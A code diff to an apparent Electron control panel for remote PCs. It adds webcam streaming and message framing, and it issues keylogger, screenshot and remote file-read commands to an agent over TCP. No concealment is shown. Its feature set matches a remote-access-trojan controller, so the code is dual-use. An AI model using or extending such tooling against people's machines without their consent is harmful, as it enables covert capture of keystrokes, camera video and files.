@@ -42,6 +42,7 @@ type RemotePcConfig = Omit<RemotePc, 'status'>;
 let remotePcConfig: RemotePcConfig[] = [];
 
 const screenViewerSockets = new Map<string, net.Socket>();
+const webcamSockets = new Map<string, net.Socket>();
 
 const withStatuses = async (): Promise<RemotePc[]> => {
   const statuses = await Promise.all(
@@ -58,6 +59,9 @@ const withStatuses = async (): Promise<RemotePc[]> => {
   return statuses;
 };
 
+const AGENT_REPLY_END = '\n<<END>>\n';
+
+/** Đọc đến khi đủ `\n<<END>>\n` — khớp giao thức agent; tránh cắt nhầm ở byte đầu tiên có `\n`. */
 const sendAgentCommand = (
   host: string,
   port: number,
@@ -67,8 +71,11 @@ const sendAgentCommand = (
   new Promise((resolve, reject) => {
     const socket = new net.Socket();
     let buffer = '';
+    let finished = false;
 
     const done = (err?: Error, data?: string) => {
+      if (finished) return;
+      finished = true;
       socket.destroy();
       if (err) {
         reject(err);
@@ -83,8 +90,9 @@ const sendAgentCommand = (
     });
     socket.on('data', (chunk) => {
       buffer += chunk.toString('utf8');
-      if (buffer.includes('\n')) {
-        done(undefined, buffer.split('\n')[0]);
+      const pos = buffer.indexOf(AGENT_REPLY_END);
+      if (pos !== -1) {
+        done(undefined, buffer.slice(0, pos));
       }
     });
     socket.on('error', (err) => done(err));
@@ -136,6 +144,95 @@ const sendAgentCommand = (
     });
   
     screenViewerSockets.set(pcId, socket);
+  }
+
+  function startWebcamStream(
+    pcId: string,
+    host: string,
+    port: number,
+    win: BrowserWindow,
+  ) {
+    if (webcamSockets.has(pcId)) {
+      console.warn('[webcam-main] startWebcamStream: socket already exists for pcId, skipping', pcId);
+      return;
+    }
+
+    console.log('[webcam-main] connecting', { pcId, host, port });
+
+    const socket = new net.Socket();
+    let buffer = '';
+    let recvLogCount = 0;
+
+    socket.connect(port, host, () => {
+      console.log('[webcam-main] connected, sending WEBCAM_START');
+      socket.write('WEBCAM_START\n');
+    });
+
+    socket.on('data', (chunk) => {
+      buffer += chunk.toString('utf8');
+      if (recvLogCount < 3) {
+        recvLogCount += 1;
+        console.log('[webcam-main] recv chunk', recvLogCount, 'bytes=', chunk.length, 'bufferLen=', buffer.length);
+      }
+
+      let pos: number;
+      while ((pos = buffer.indexOf('\n<<END>>\n')) !== -1) {
+        const rawMessage = buffer.slice(0, pos).trim();
+        buffer = buffer.slice(pos + '\n<<END>>\n'.length);
+
+        if (!rawMessage) continue;
+
+        try {
+          const parsed = JSON.parse(rawMessage) as Record<string, unknown>;
+          const cmd = typeof parsed.command === 'string' ? parsed.command : '?';
+          const ok = parsed.ok === true;
+          const dataLen = typeof parsed.data === 'string' ? parsed.data.length : 0;
+          console.log('[webcam-main] parsed message', { command: cmd, ok, dataLen, rawHead: rawMessage.slice(0, 120) });
+          win.webContents.send('agent:webcam-frame', parsed);
+        } catch (e) {
+          console.warn('[webcam-main] JSON.parse failed', (e as Error).message, 'rawHead=', rawMessage.slice(0, 200));
+        }
+      }
+    });
+
+    socket.on('close', () => {
+      console.log('[webcam-main] socket closed', pcId);
+      webcamSockets.delete(pcId);
+    });
+
+    socket.on('error', (err) => {
+      console.warn('[webcam-main] socket error', pcId, err.message);
+      try {
+        win.webContents.send('agent:webcam-frame', {
+          ok: false,
+          command: 'WEBCAM_START',
+          message: `socket: ${err.message}`,
+        });
+      } catch {
+        // window may be gone
+      }
+      webcamSockets.delete(pcId);
+    });
+
+    webcamSockets.set(pcId, socket);
+  }
+
+  function stopWebcamStream(pcId: string) {
+    const socket = webcamSockets.get(pcId);
+    if (!socket) {
+      console.log('[webcam-main] stopWebcamStream: no socket for', pcId);
+      return;
+    }
+
+    console.log('[webcam-main] stopWebcamStream', pcId);
+    try {
+      socket.write('WEBCAM_STOP\n');
+    } catch {
+      // ignore
+    }
+
+    socket.destroy();
+    webcamSockets.delete(pcId);
   }
   
   function stopScreenViewer(pcId: string) {
@@ -202,7 +299,16 @@ ipcMain.handle('agent:run-command', async (_event, payload: { pcId: string; comm
     return { ok: false, message: 'Unknown target PC', raw: '' };
   }
   try {
-    const timeoutMs = payload.command === 'SCREENSHOT' ? 12000 : 2500;
+    let timeoutMs = 2500;
+    if (payload.command === 'SCREENSHOT') timeoutMs = 12000;
+    else if (payload.command === 'WEBCAM_RECORD_STOP') timeoutMs = 20000;
+    else if (
+      payload.command === 'KEYLOGGER_GET_LOG' ||
+      payload.command === 'KEYLOGGER_STOP' ||
+      payload.command === 'KEYLOGGER_START'
+    ) {
+      timeoutMs = 30000;
+    }
     const raw = await sendAgentCommand(target.host, target.port, payload.command, timeoutMs);
     return { ok: raw.includes('"ok":true'), message: 'Command executed', raw };
   } catch (error) {
@@ -266,7 +372,7 @@ ipcMain.handle(
         target.host,
         target.port,
         `READ_FILE_BASE64 ${remotePath}`,
-        20000,
+        120000,
       );
       const parsed = JSON.parse(raw) as { ok?: boolean; data?: string; message?: string };
       if (parsed.ok !== true || typeof parsed.data !== 'string') {
@@ -344,6 +450,28 @@ ipcMain.handle('agent:stop-screen-viewer', async (_event, payload: { pcId: strin
   return { ok: true };
 });
 
+ipcMain.handle('agent:start-webcam', async (_event, payload: { pcId: string }) => {
+  const target = remotePcConfig.find((pc) => pc.id === payload.pcId);
+
+  if (!target) {
+    return { ok: false, message: 'Unknown target PC' };
+  }
+
+  const win = BrowserWindow.getAllWindows()[0];
+  if (!win) {
+    return { ok: false, message: 'Window not found' };
+  }
+
+  startWebcamStream(payload.pcId, target.host, target.port, win);
+
+  return { ok: true };
+});
+
+ipcMain.handle('agent:stop-webcam', async (_event, payload: { pcId: string }) => {
+  stopWebcamStream(payload.pcId);
+  return { ok: true };
+});
+
 // This method will be called when Electron has finished
 // initialization and is ready to create browser windows.
 // Some APIs can only be used after this event occurs.
@@ -355,6 +483,8 @@ app.on('ready', createWindow);
 app.on('window-all-closed', () => {
   screenViewerSockets.forEach((socket) => socket.destroy());
   screenViewerSockets.clear();
+  webcamSockets.forEach((socket) => socket.destroy());
+  webcamSockets.clear();
 
   if (process.platform !== 'darwin') {
     app.quit();
